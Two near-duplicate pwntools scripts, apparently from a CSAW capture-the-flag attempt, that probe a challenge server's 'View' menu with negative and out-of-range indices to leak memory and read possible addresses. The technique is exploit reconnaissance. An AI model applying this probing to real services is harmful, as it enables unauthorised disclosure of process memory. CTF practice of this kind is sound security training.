from pwn import *
import sys
import time

def test_index(index):
    try:
        p = remote('pwn.chal.csaw.io', 7900)
        p.recvuntil(b'3: Exit')  # Wait for menu
        p.sendline(b'V')  # View
        p.recvuntil(b'Index : ')
        p.sendline(str(index).encode())
        response = p.recvline()  # Get data line
        p.close()
        return response
    except Exception as e:
        log.error(f"Error with index {index}: {str(e)}")
        return None

def analyze_leak(index, data):
    if not data:
        return

    print(f"\nIndex {index}:")
    try:
        if data.startswith(b'Data : '):
            data = data[7:]  # Skip "Data : "

        # Print hex representation
        print(hexdump(data))

        # Try to interpret as address if 8 bytes
        if len(data.strip()) == 8:
            try:
                val = u64(data.strip())
                print(f"As u64: {hex(val)}")
            except:
                pass
    except:
        print("Could not analyze data")

def main():
    # Test negative indices
    print("\n=== Testing Negative Indices ===")
    for i in range(1, 21):
        leak = test_index(-i)
        if leak:
            analyze_leak(-i, leak)
        time.sleep(0.5)  # Avoid rate limiting

    # Test positive indices near code section
    print("\n=== Testing Positive Indices ===")
    for i in range(256, 513, 8):
        leak = test_index(i)
        if leak:
            analyze_leak(i, leak)
        time.sleep(0.5)  # Avoid rate limiting

if __name__ == '__main__':
    main()

#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'error'

def test_index(index):
    try:
        p = remote('pwn.chal.csaw.io', 7900)
        p.recvuntil(b'Menu:\n')
        p.sendline(b'V')
        p.recvuntil(b'Index : ')
        p.sendline(str(index).encode())
        response = p.recvline()
        if b'Data : ' in response:
            data = response.split(b'Data : ')[1].strip()
            return data
        p.close()
        return None
    except Exception as e:
        if p:
            p.close()
        print(f"Error with index {index}: {str(e)}")
        return None

def analyze_leak(index, data):
    if not data:
        return

    print(f"\nIndex {index}:")
    print("Raw hex:")
    print(hexdump(data))

    # Try to interpret as address if it looks like the right size
    if len(data) >= 8:
        try:
            val = u64(data[:8].ljust(8, b'\x00'))
            print(f"As u64: {hex(val)}")
        except:
            pass

def main():
    # Test negative indices
    print("\n=== Testing Negative Indices ===")
    for i in range(1, 21):
        leak = test_index(-i)
        if leak:
            analyze_leak(-i, leak)
        time.sleep(0.5)

    # Test positive indices near code section
    print("\n=== Testing Positive Indices ===")
    for i in range(256, 513, 8):
        leak = test_index(i)
        if leak:
            analyze_leak(i, leak)
        time.sleep(0.5)

if __name__ == '__main__':
    main()

